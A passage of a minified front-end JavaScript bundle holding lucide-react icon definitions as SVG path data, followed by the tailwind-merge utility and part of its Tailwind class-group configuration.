    ["path", { d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8", key: "v9h5vc" }],
    ["path", { d: "M21 3v5h-5", key: "1q7to0" }],
    ["path", { d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16", key: "3uifl3" }],
    ["path", { d: "M8 16H3v5", key: "1cv678" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const cx = F("Scan", [
    ["path", { d: "M3 7V5a2 2 0 0 1 2-2h2", key: "aa7l1z" }],
    ["path", { d: "M17 3h2a2 2 0 0 1 2 2v2", key: "4qcy5o" }],
    ["path", { d: "M21 17v2a2 2 0 0 1-2 2h-2", key: "6vwrx8" }],
    ["path", { d: "M7 21H5a2 2 0 0 1-2-2v-2", key: "ioqczr" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Gr = F("Search", [
    ["circle", { cx: "11", cy: "11", r: "8", key: "4ej97u" }],
    ["path", { d: "m21 21-4.3-4.3", key: "1qie3q" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ux = F("Send", [
    [
        "path",
        {
            d: "M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z",
            key: "1ffxy3",
        },
    ],
    ["path", { d: "m21.854 2.147-10.94 10.939", key: "12cjpa" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const dx = F("Server", [
    ["rect", { width: "20", height: "8", x: "2", y: "2", rx: "2", ry: "2", key: "ngkwjq" }],
    ["rect", { width: "20", height: "8", x: "2", y: "14", rx: "2", ry: "2", key: "iecqi9" }],
    ["line", { x1: "6", x2: "6.01", y1: "6", y2: "6", key: "16zg32" }],
    ["line", { x1: "6", x2: "6.01", y1: "18", y2: "18", key: "nzw8ys" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const fo = F("Shield", [
    [
        "path",
        {
            d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
            key: "oel41y",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const xc = F("Smartphone", [
    ["rect", { width: "14", height: "20", x: "5", y: "2", rx: "2", ry: "2", key: "1yt0o3" }],
    ["path", { d: "M12 18h.01", key: "mhygvu" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const bp = F("SquarePen", [
    ["path", { d: "M12 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7", key: "1m0v6g" }],
    [
        "path",
        {
            d: "M18.375 2.625a1 1 0 0 1 3 3l-9.013 9.014a2 2 0 0 1-.853.505l-2.873.84a.5.5 0 0 1-.62-.62l.84-2.873a2 2 0 0 1 .506-.852z",
            key: "ohrbg2",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const px = F("Sun", [
    ["circle", { cx: "12", cy: "12", r: "4", key: "4exip2" }],
    ["path", { d: "M12 2v2", key: "tus03m" }],
    ["path", { d: "M12 20v2", key: "1lh1kg" }],
    ["path", { d: "m4.93 4.93 1.41 1.41", key: "149t6j" }],
    ["path", { d: "m17.66 17.66 1.41 1.41", key: "ptbguv" }],
    ["path", { d: "M2 12h2", key: "1t8f8n" }],
    ["path", { d: "M20 12h2", key: "1q8mjw" }],
    ["path", { d: "m6.34 17.66-1.41 1.41", key: "1m8zz5" }],
    ["path", { d: "m19.07 4.93-1.41 1.41", key: "1shlcs" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ig = F("Target", [
    ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
    ["circle", { cx: "12", cy: "12", r: "6", key: "1vlfrh" }],
    ["circle", { cx: "12", cy: "12", r: "2", key: "1c9p78" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const fr = F("Terminal", [
    ["polyline", { points: "4 17 10 11 4 5", key: "akl6gq" }],
    ["line", { x1: "12", x2: "20", y1: "19", y2: "19", key: "q2wloq" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const pl = F("Trash2", [
    ["path", { d: "M3 6h18", key: "d0wm0j" }],
    ["path", { d: "M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6", key: "4alrt4" }],
    ["path", { d: "M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2", key: "v07s0e" }],
    ["line", { x1: "10", x2: "10", y1: "11", y2: "17", key: "1uufr5" }],
    ["line", { x1: "14", x2: "14", y1: "11", y2: "17", key: "xtxkd" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const fx = F("TriangleAlert", [
    ["path", { d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3", key: "wmoenq" }],
    ["path", { d: "M12 9v4", key: "juzpu7" }],
    ["path", { d: "M12 17h.01", key: "p32p05" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const mx = F("Upload", [
    ["path", { d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4", key: "ih7n3h" }],
    ["polyline", { points: "17 8 12 3 7 8", key: "t8dd8p" }],
    ["line", { x1: "12", x2: "12", y1: "3", y2: "15", key: "widbto" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const hx = F("UserX", [
    ["path", { d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2", key: "1yyitq" }],
    ["circle", { cx: "9", cy: "7", r: "4", key: "nufk8" }],
    ["line", { x1: "17", x2: "22", y1: "8", y2: "13", key: "3nzzx3" }],
    ["line", { x1: "22", x2: "17", y1: "8", y2: "13", key: "1swrse" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const wc = F("User", [
    ["path", { d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2", key: "975kel" }],
    ["circle", { cx: "12", cy: "7", r: "4", key: "17ys0d" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const gx = F("Wifi", [
    ["path", { d: "M12 20h.01", key: "zekei9" }],
    ["path", { d: "M2 8.82a15 15 0 0 1 20 0", key: "dnpr2z" }],
    ["path", { d: "M5 12.859a10 10 0 0 1 14 0", key: "1x1e6c" }],
    ["path", { d: "M8.5 16.429a5 5 0 0 1 7 0", key: "1bycff" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const _u = F("X", [
    ["path", { d: "M18 6 6 18", key: "1bl5f8" }],
    ["path", { d: "m6 6 12 12", key: "d8bk6v" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ag = F("Zap", [
        [
            "path",
            {
                d: "M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",
                key: "1xq2db",
            },
        ],
    ]),
    Lu = "-",
    yx = (e) => {
        const t = xx(e),
            { conflictingClassGroups: n, conflictingClassGroupModifiers: r } = e;
        return {
            getClassGroupId: (i) => {
                const a = i.split(Lu);
                return a[0] === "" && a.length !== 1 && a.shift(), lg(a, t) || vx(i);
            },
            getConflictingClassGroupIds: (i, a) => {
                const l = n[i] || [];
                return a && r[i] ? [...l, ...r[i]] : l;
            },
        };
    },
    lg = (e, t) => {
        var i;
        if (e.length === 0) return t.classGroupId;
        const n = e[0],
            r = t.nextPart.get(n),
            o = r ? lg(e.slice(1), r) : void 0;
        if (o) return o;
        if (t.validators.length === 0) return;
        const s = e.join(Lu);
        return (i = t.validators.find(({ validator: a }) => a(s))) == null ? void 0 : i.classGroupId;
    },
    kp = /^\[(.+)\]$/,
    vx = (e) => {
        if (kp.test(e)) {
            const t = kp.exec(e)[1],
                n = t == null ? void 0 : t.substring(0, t.indexOf(":"));
            if (n) return "arbitrary.." + n;
        }
    },
    xx = (e) => {
        const { theme: t, prefix: n } = e,
            r = { nextPart: new Map(), validators: [] };
        return (
            Sx(Object.entries(e.classGroups), n).forEach(([s, i]) => {
                Sc(i, r, s, t);
            }),
            r
        );
    },
    Sc = (e, t, n, r) => {
        e.forEach((o) => {
            if (typeof o == "string") {
                const s = o === "" ? t : Cp(t, o);
                s.classGroupId = n;
                return;
            }
            if (typeof o == "function") {
                if (wx(o)) {
                    Sc(o(r), t, n, r);
                    return;
                }
                t.validators.push({ validator: o, classGroupId: n });
                return;
            }
            Object.entries(o).forEach(([s, i]) => {
                Sc(i, Cp(t, s), n, r);
            });
        });
    },
    Cp = (e, t) => {
        let n = e;
        return (
            t.split(Lu).forEach((r) => {
                n.nextPart.has(r) || n.nextPart.set(r, { nextPart: new Map(), validators: [] }),
                    (n = n.nextPart.get(r));
            }),
            n
        );
    },
    wx = (e) => e.isThemeGetter,
    Sx = (e, t) =>
        t
            ? e.map(([n, r]) => {
                  const o = r.map((s) =>
                      typeof s == "string"
                          ? t + s
                          : typeof s == "object"
                            ? Object.fromEntries(Object.entries(s).map(([i, a]) => [t + i, a]))
                            : s
                  );
                  return [n, o];
              })
            : e,
    bx = (e) => {
        if (e < 1) return { get: () => {}, set: () => {} };
        let t = 0,
            n = new Map(),
            r = new Map();
        const o = (s, i) => {
            n.set(s, i), t++, t > e && ((t = 0), (r = n), (n = new Map()));
        };
        return {
            get(s) {
                let i = n.get(s);
                if (i !== void 0) return i;
                if ((i = r.get(s)) !== void 0) return o(s, i), i;
            },
            set(s, i) {
                n.has(s) ? n.set(s, i) : o(s, i);
            },
        };
    },
    cg = "!",
    kx = (e) => {
        const { separator: t, experimentalParseClassName: n } = e,
            r = t.length === 1,
            o = t[0],
            s = t.length,
            i = (a) => {
                const l = [];
                let u = 0,
                    d = 0,
                    p;
                for (let w = 0; w < a.length; w++) {
                    let g = a[w];
                    if (u === 0) {
                        if (g === o && (r || a.slice(w, w + s) === t)) {
                            l.push(a.slice(d, w)), (d = w + s);
                            continue;
                        }
                        if (g === "/") {
                            p = w;
                            continue;
                        }
                    }
                    g === "[" ? u++ : g === "]" && u--;
                }
                const m = l.length === 0 ? a : a.substring(d),
                    f = m.startsWith(cg),
                    S = f ? m.substring(1) : m,
                    v = p && p > d ? p - d : void 0;
                return { modifiers: l, hasImportantModifier: f, baseClassName: S, maybePostfixModifierPosition: v };
            };
        return n ? (a) => n({ className: a, parseClassName: i }) : i;
    },
    Cx = (e) => {
        if (e.length <= 1) return e;
        const t = [];
        let n = [];
        return (
            e.forEach((r) => {
                r[0] === "[" ? (t.push(...n.sort(), r), (n = [])) : n.push(r);
            }),
            t.push(...n.sort()),
            t
        );
    },
    Ex = (e) => ({ cache: bx(e.cacheSize), parseClassName: kx(e), ...yx(e) }),
    Nx = /\s+/,
    Px = (e, t) => {
        const { parseClassName: n, getClassGroupId: r, getConflictingClassGroupIds: o } = t,
            s = [],
            i = e.trim().split(Nx);
        let a = "";
        for (let l = i.length - 1; l >= 0; l -= 1) {
            const u = i[l],
                { modifiers: d, hasImportantModifier: p, baseClassName: m, maybePostfixModifierPosition: f } = n(u);
            let S = !!f,
                v = r(S ? m.substring(0, f) : m);
            if (!v) {
                if (!S) {
                    a = u + (a.length > 0 ? " " + a : a);
                    continue;
                }
                if (((v = r(m)), !v)) {
                    a = u + (a.length > 0 ? " " + a : a);
                    continue;
                }
                S = !1;
            }
            const w = Cx(d).join(":"),
                g = p ? w + cg : w,
                h = g + v;
            if (s.includes(h)) continue;
            s.push(h);
            const y = o(v, S);
            for (let b = 0; b < y.length; ++b) {
                const k = y[b];
                s.push(g + k);
            }
            a = u + (a.length > 0 ? " " + a : a);
        }
        return a;
    };
function Tx() {
    let e = 0,
        t,
        n,
        r = "";
    for (; e < arguments.length; ) (t = arguments[e++]) && (n = ug(t)) && (r && (r += " "), (r += n));
    return r;
}
const ug = (e) => {
    if (typeof e == "string") return e;
    let t,
        n = "";
    for (let r = 0; r < e.length; r++) e[r] && (t = ug(e[r])) && (n && (n += " "), (n += t));
    return n;
};
function jx(e, ...t) {
    let n,
        r,
        o,
        s = i;
    function i(l) {
        const u = t.reduce((d, p) => p(d), e());
        return (n = Ex(u)), (r = n.cache.get), (o = n.cache.set), (s = a), a(l);
    }
    function a(l) {
        const u = r(l);
        if (u) return u;
        const d = Px(l, n);
        return o(l, d), d;
    }
    return function () {
        return s(Tx.apply(null, arguments));
    };
}
const se = (e) => {
        const t = (n) => n[e] || [];
        return (t.isThemeGetter = !0), t;
    },
    dg = /^\[(?:([a-z-]+):)?(.+)\]$/i,
    Rx = /^\d+\/\d+$/,
    Ax = new Set(["px", "full", "screen"]),
    Mx = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,
    _x =
        /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,
    Lx = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,
    Ox = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,
    Ix = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,
    Bt = (e) => qr(e) || Ax.has(e) || Rx.test(e),
    fn = (e) => xo(e, "length", Vx),
    qr = (e) => !!e && !Number.isNaN(Number(e)),
    fl = (e) => xo(e, "number", qr),
    Lo = (e) => !!e && Number.isInteger(Number(e)),
    Dx = (e) => e.endsWith("%") && qr(e.slice(0, -1)),
    Q = (e) => dg.test(e),
    mn = (e) => Mx.test(e),
    zx = new Set(["length", "size", "percentage"]),
    Fx = (e) => xo(e, zx, pg),
    Ux = (e) => xo(e, "position", pg),
    $x = new Set(["image", "url"]),
    Hx = (e) => xo(e, $x, Kx),
    Bx = (e) => xo(e, "", Wx),
    Oo = () => !0,
    xo = (e, t, n) => {
        const r = dg.exec(e);
        return r ? (r[1] ? (typeof t == "string" ? r[1] === t : t.has(r[1])) : n(r[2])) : !1;
    },
    Vx = (e) => _x.test(e) && !Lx.test(e),
    pg = () => !1,
    Wx = (e) => Ox.test(e),
    Kx = (e) => Ix.test(e),
    Qx = () => {
        const e = se("colors"),
            t = se("spacing"),
            n = se("blur"),
            r = se("brightness"),
            o = se("borderColor"),
            s = se("borderRadius"),
            i = se("borderSpacing"),
            a = se("borderWidth"),
            l = se("contrast"),
            u = se("grayscale"),
            d = se("hueRotate"),
            p = se("invert"),
            m = se("gap"),
            f = se("gradientColorStops"),
            S = se("gradientColorStopPositions"),
            v = se("inset"),
            w = se("margin"),
            g = se("opacity"),
            h = se("padding"),
            y = se("saturate"),
            b = se("scale"),
            k = se("sepia"),
            C = se("skew"),
            E = se("space"),
            j = se("translate"),
            _ = () => ["auto", "contain", "none"],
            M = () => ["auto", "hidden", "clip", "visible", "scroll"],
            H = () => ["auto", Q, t],
            D = () => [Q, t],
            G = () => ["", Bt, fn],
            O = () => ["auto", qr, Q],
            $ = () => [
                "bottom",
                "center",
                "left",
                "left-bottom",
                "left-top",
                "right",
                "right-bottom",
                "right-top",
                "top",
            ],
            B = () => ["solid", "dashed", "dotted", "double", "none"],
            I = () => [
                "normal",
                "multiply",
                "screen",
                "overlay",
                "darken",
                "lighten",
                "color-dodge",
                "color-burn",
                "hard-light",
                "soft-light",
                "difference",
                "exclusion",
                "hue",
                "saturation",
                "color",
                "luminosity",
            ],
            N = () => ["start", "end", "center", "between", "around", "evenly", "stretch"],
            T = () => ["", "0", Q],
            L = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"],
            V = () => [qr, Q];
        return {
            cacheSize: 500,
            separator: ":",
            theme: {
                colors: [Oo],
                spacing: [Bt, fn],
                blur: ["none", "", mn, Q],
                brightness: V(),
                borderColor: [e],
                borderRadius: ["none", "", "full", mn, Q],
                borderSpacing: D(),
                borderWidth: G(),
                contrast: V(),
                grayscale: T(),
                hueRotate: V(),
                invert: T(),
                gap: D(),
                gradientColorStops: [e],
                gradientColorStopPositions: [Dx, fn],
                inset: H(),
                margin: H(),
                opacity: V(),
                padding: D(),
                saturate: V(),
                scale: V(),
                sepia: T(),
                skew: V(),
                space: D(),
                translate: D(),
            },
            classGroups: {
                aspect: [{ aspect: ["auto", "square", "video", Q] }],
                container: ["container"],
                columns: [{ columns: [mn] }],
                "break-after": [{ "break-after": L() }],
                "break-before": [{ "break-before": L() }],
                "break-inside": [{ "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"] }],
                "box-decoration": [{ "box-decoration": ["slice", "clone"] }],
                box: [{ box: ["border", "content"] }],
                display: [
                    "block",
                    "inline-block",
                    "inline",
                    "flex",
                    "inline-flex",
                    "table",
                    "inline-table",
                    "table-caption",
                    "table-cell",
                    "table-column",
                    "table-column-group",
                    "table-footer-group",
                    "table-header-group",
                    "table-row-group",
                    "table-row",
                    "flow-root",
                    "grid",
                    "inline-grid",
                    "contents",
                    "list-item",
                    "hidden",
                ],
                float: [{ float: ["right", "left", "none", "start", "end"] }],
                clear: [{ clear: ["left", "right", "both", "none", "start", "end"] }],
                isolation: ["isolate", "isolation-auto"],
                "object-fit": [{ object: ["contain", "cover", "fill", "none", "scale-down"] }],
                "object-position": [{ object: [...$(), Q] }],
                overflow: [{ overflow: M() }],
                "overflow-x": [{ "overflow-x": M() }],
                "overflow-y": [{ "overflow-y": M() }],
                overscroll: [{ overscroll: _() }],
                "overscroll-x": [{ "overscroll-x": _() }],
                "overscroll-y": [{ "overscroll-y": _() }],
                position: ["static", "fixed", "absolute", "relative", "sticky"],
                inset: [{ inset: [v] }],
                "inset-x": [{ "inset-x": [v] }],
                "inset-y": [{ "inset-y": [v] }],
                start: [{ start: [v] }],
                end: [{ end: [v] }],
                top: [{ top: [v] }],
                right: [{ right: [v] }],
                bottom: [{ bottom: [v] }],
                left: [{ left: [v] }],
                visibility: ["visible", "invisible", "collapse"],
                z: [{ z: ["auto", Lo, Q] }],
                basis: [{ basis: H() }],
                "flex-direction": [{ flex: ["row", "row-reverse", "col", "col-reverse"] }],
                "flex-wrap": [{ flex: ["wrap", "wrap-reverse", "nowrap"] }],
                flex: [{ flex: ["1", "auto", "initial", "none", Q] }],
                grow: [{ grow: T() }],
                shrink: [{ shrink: T() }],
                order: [{ order: ["first", "last", "none", Lo, Q] }],
                "grid-cols": [{ "grid-cols": [Oo] }],
                "col-start-end": [{ col: ["auto", { span: ["full", Lo, Q] }, Q] }],
                "col-start": [{ "col-start": O() }],
                "col-end": [{ "col-end": O() }],
                "grid-rows": [{ "grid-rows": [Oo] }],
                "row-start-end": [{ row: ["auto", { span: [Lo, Q] }, Q] }],
                "row-start": [{ "row-start": O() }],
                "row-end": [{ "row-end": O() }],
                "grid-flow": [{ "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"] }],
                "auto-cols": [{ "auto-cols": ["auto", "min", "max", "fr", Q] }],
                "auto-rows": [{ "auto-rows": ["auto", "min", "max", "fr", Q] }],
                gap: [{ gap: [m] }],
                "gap-x": [{ "gap-x": [m] }],
                "gap-y": [{ "gap-y": [m] }],
                "justify-content": [{ justify: ["normal", ...N()] }],
                "justify-items": [{ "justify-items": ["start", "end", "center", "stretch"] }],
                "justify-self": [{ "justify-self": ["auto", "start", "end", "center", "stretch"] }],
                "align-content": [{ content: ["normal", ...N(), "baseline"] }],
                "align-items": [{ items: ["start", "end", "center", "baseline", "stretch"] }],
                "align-self": [{ self: ["auto", "start", "end", "center", "stretch", "baseline"] }],
                "place-content": [{ "place-content": [...N(), "baseline"] }],
                "place-items": [{ "place-items": ["start", "end", "center", "baseline", "stretch"] }],
                "place-self": [{ "place-self": ["auto", "start", "end", "center", "stretch"] }],
                p: [{ p: [h] }],
                px: [{ px: [h] }],
                py: [{ py: [h] }],
                ps: [{ ps: [h] }],
                pe: [{ pe: [h] }],
                pt: [{ pt: [h] }],
                pr: [{ pr: [h] }],
                pb: [{ pb: [h] }],
                pl: [{ pl: [h] }],
                m: [{ m: [w] }],
                mx: [{ mx: [w] }],
                my: [{ my: [w] }],
                ms: [{ ms: [w] }],
                me: [{ me: [w] }],
                mt: [{ mt: [w] }],
                mr: [{ mr: [w] }],
                mb: [{ mb: [w] }],
                ml: [{ ml: [w] }],
                "space-x": [{ "space-x": [E] }],
                "space-x-reverse": ["space-x-reverse"],
                "space-y": [{ "space-y": [E] }],
                "space-y-reverse": ["space-y-reverse"],
                w: [{ w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", Q, t] }],
                "min-w": [{ "min-w": [Q, t, "min", "max", "fit"] }],
                "max-w": [{ "max-w": [Q, t, "none", "full", "min", "max", "fit", "prose", { screen: [mn] }, mn] }],
                h: [{ h: [Q, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"] }],
                "min-h": [{ "min-h": [Q, t, "min", "max", "fit", "svh", "lvh", "dvh"] }],
                "max-h": [{ "max-h": [Q, t, "min", "max", "fit", "svh", "lvh", "dvh"] }],
                size: [{ size: [Q, t, "auto", "min", "max", "fit"] }],
                "font-size": [{ text: ["base", mn, fn] }],
                "font-smoothing": ["antialiased", "subpixel-antialiased"],
                "font-style": ["italic", "not-italic"],
                "font-weight": [
                    {
                        font: [
                            "thin",
                            "extralight",
                            "light",
                            "normal",
                            "medium",
                            "semibold",
                            "bold",
                            "extrabold",
                            "black",
                            fl,
                        ],
                    },
                ],
                "font-family": [{ font: [Oo] }],
                "fvn-normal": ["normal-nums"],
                "fvn-ordinal": ["ordinal"],
                "fvn-slashed-zero": ["slashed-zero"],
                "fvn-figure": ["lining-nums", "oldstyle-nums"],
                "fvn-spacing": ["proportional-nums", "tabular-nums"],
                "fvn-fraction": ["diagonal-fractions", "stacked-fractions"],
                tracking: [{ tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", Q] }],
                "line-clamp": [{ "line-clamp": ["none", qr, fl] }],
                leading: [{ leading: ["none", "tight", "snug", "normal", "relaxed", "loose", Bt, Q] }],
                "list-image": [{ "list-image": ["none", Q] }],
                "list-style-type": [{ list: ["none", "disc", "decimal", Q] }],
                "list-style-position": [{ list: ["inside", "outside"] }],
                "placeholder-color": [{ placeholder: [e] }],
                "placeholder-opacity": [{ "placeholder-opacity": [g] }],
                "text-alignment": [{ text: ["left", "center", "right", "justify", "start", "end"] }],
                "text-color": [{ text: [e] }],
                "text-opacity": [{ "text-opacity": [g] }],
                "text-decoration": ["underline", "overline", "line-through", "no-underline"],
                "text-decoration-style": [{ decoration: [...B(), "wavy"] }],
                "text-decoration-thickness": [{ decoration: ["auto", "from-font", Bt, fn] }],
                "underline-offset": [{ "underline-offset": ["auto", Bt, Q] }],
                "text-decoration-color": [{ decoration: [e] }],
                "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
                "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
                "text-wrap": [{ text: ["wrap", "nowrap", "balance", "pretty"] }],
                indent: [{ indent: D() }],
                "vertical-align": [
                    { align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", Q] },
                ],
                whitespace: [{ whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"] }],
                break: [{ break: ["normal", "words", "all", "keep"] }],
                hyphens: [{ hyphens: ["none", "manual", "auto"] }],
                content: [{ content: ["none", Q] }],
                "bg-attachment": [{ bg: ["fixed", "local", "scroll"] }],
                "bg-clip": [{ "bg-clip": ["border", "padding", "content", "text"] }],
                "bg-opacity": [{ "bg-opacity": [g] }],
                "bg-origin": [{ "bg-origin": ["border", "padding", "content"] }],
                "bg-position": [{ bg: [...$(), Ux] }],
                "bg-repeat": [{ bg: ["no-repeat", { repeat: ["", "x", "y", "round", "space"] }] }],
                "bg-size": [{ bg: ["auto", "cover", "contain", Fx] }],
                "bg-image": [{ bg: ["none", { "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"] }, Hx] }],
                "bg-color": [{ bg: [e] }],
                "gradient-from-pos": [{ from: [S] }],
                "gradient-via-pos": [{ via: [S] }],
                "gradient-to-pos": [{ to: [S] }],
                "gradient-from": [{ from: [f] }],
                "gradient-via": [{ via: [f] }],
                "gradient-to": [{ to: [f] }],
                rounded: [{ rounded: [s] }],
                "rounded-s": [{ "rounded-s": [s] }],
                "rounded-e": [{ "rounded-e": [s] }],
                "rounded-t": [{ "rounded-t": [s] }],
                "rounded-r": [{ "rounded-r": [s] }],
                "rounded-b": [{ "rounded-b": [s] }],
                "rounded-l": [{ "rounded-l": [s] }],
                "rounded-ss": [{ "rounded-ss": [s] }],
                "rounded-se": [{ "rounded-se": [s] }],
                "rounded-ee": [{ "rounded-ee": [s] }],
                "rounded-es": [{ "rounded-es": [s] }],
                "rounded-tl": [{ "rounded-tl": [s] }],
                "rounded-tr": [{ "rounded-tr": [s] }],
                "rounded-br": [{ "rounded-br": [s] }],
                "rounded-bl": [{ "rounded-bl": [s] }],
                "border-w": [{ border: [a] }],
                "border-w-x": [{ "border-x": [a] }],
                "border-w-y": [{ "border-y": [a] }],
                "border-w-s": [{ "border-s": [a] }],
                "border-w-e": [{ "border-e": [a] }],
                "border-w-t": [{ "border-t": [a] }],
                "border-w-r": [{ "border-r": [a] }],
                "border-w-b": [{ "border-b": [a] }],
                "border-w-l": [{ "border-l": [a] }],
                "border-opacity": [{ "border-opacity": [g] }],
                "border-style": [{ border: [...B(), "hidden"] }],
                "divide-x": [{ "divide-x": [a] }],
                "divide-x-reverse": ["divide-x-reverse"],
                "divide-y": [{ "divide-y": [a] }],
                "divide-y-reverse": ["divide-y-reverse"],
                "divide-opacity": [{ "divide-opacity": [g] }],
                "divide-style": [{ divide: B() }],
                "border-color": [{ border: [o] }],
                "border-color-x": [{ "border-x": [o] }],
                "border-color-y": [{ "border-y": [o] }],
                "border-color-s": [{ "border-s": [o] }],
                "border-color-e": [{ "border-e": [o] }],
                "border-color-t": [{ "border-t": [o] }],
                "border-color-r": [{ "border-r": [o] }],
                "border-color-b": [{ "border-b": [o] }],
                "border-color-l": [{ "border-l": [o] }],
                "divide-color": [{ divide: [o] }],
                "outline-style": [{ outline: ["", ...B()] }],
                "outline-offset": [{ "outline-offset": [Bt, Q] }],
                "outline-w": [{ outline: [Bt, fn] }],
                "outline-color": [{ outline: [e] }],
                "ring-w": [{ ring: G() }],
                "ring-w-inset": ["ring-inset"],
                "ring-color": [{ ring: [e] }],
                "ring-opacity": [{ "ring-opacity": [g] }],
                "ring-offset-w": [{ "ring-offset": [Bt, fn] }],
                "ring-offset-color": [{ "ring-offset": [e] }],
                shadow: [{ shadow: ["", "inner", "none", mn, Bx] }],
                "shadow-color": [{ shadow: [Oo] }],
                opacity: [{ opacity: [g] }],
                "mix-blend": [{ "mix-blend": [...I(), "plus-lighter", "plus-darker"] }],
                "bg-blend": [{ "bg-blend": I() }],
                filter: [{ filter: ["", "none"] }],
                blur: [{ blur: [n] }],
                brightness: [{ brightness: [r] }],
                contrast: [{ contrast: [l] }],
                "drop-shadow": [{ "drop-shadow": ["", "none", mn, Q] }],
                grayscale: [{ grayscale: [u] }],
                "hue-rotate": [{ "hue-rotate": [d] }],
                invert: [{ invert: [p] }],
                saturate: [{ saturate: [y] }],
                sepia: [{ sepia: [k] }],
                "backdrop-filter": [{ "backdrop-filter": ["", "none"] }],
                "backdrop-blur": [{ "backdrop-blur": [n] }],
                "backdrop-brightness": [{ "backdrop-brightness": [r] }],
                "backdrop-contrast": [{ "backdrop-contrast": [l] }],
                "backdrop-grayscale": [{ "backdrop-grayscale": [u] }],
                "backdrop-hue-rotate": [{ "backdrop-hue-rotate": [d] }],
                "backdrop-invert": [{ "backdrop-invert": [p] }],
                "backdrop-opacity": [{ "backdrop-opacity": [g] }],
                "backdrop-saturate": [{ "backdrop-saturate": [y] }],
                "backdrop-sepia": [{ "backdrop-sepia": [k] }],
